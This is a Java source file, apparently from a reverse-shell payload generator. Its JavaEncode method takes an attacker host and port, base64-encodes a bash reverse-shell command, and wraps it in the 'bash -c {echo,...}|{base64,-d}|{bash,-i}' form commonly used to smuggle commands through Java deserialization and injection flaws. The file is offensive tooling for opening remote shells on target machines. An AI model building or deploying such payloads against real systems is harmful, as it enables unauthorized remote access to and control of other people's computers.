package com.swordHostDemo.utls;

import com.swordHostDemo.controller.Reverse;

import java.io.UnsupportedEncodingException;
import java.util.Base64;

/**
 * @date: 2022/12/29 20:25
 * @description:
 */
public class EnCode {
    public static String base64Encode(String str) {
        byte[] textByte = new byte[0];
        try {
            textByte = str.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        final String encodedText = Base64.getEncoder().encodeToString(textByte);
        System.out.println(encodedText);
        return encodedText;
    }

    public static String JavaEncode(String Lhost, String Lport) {

        String base64EecodeStr = null;
        try {
            base64EecodeStr = Base64.getEncoder().encodeToString(Reverse.ReverseBash(Lhost, Lport).getBytes("utf-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        base64EecodeStr = "bash -c {echo," + base64EecodeStr + "}|{base64,-d}|{bash,-i}";
        return base64EecodeStr;
    }
}

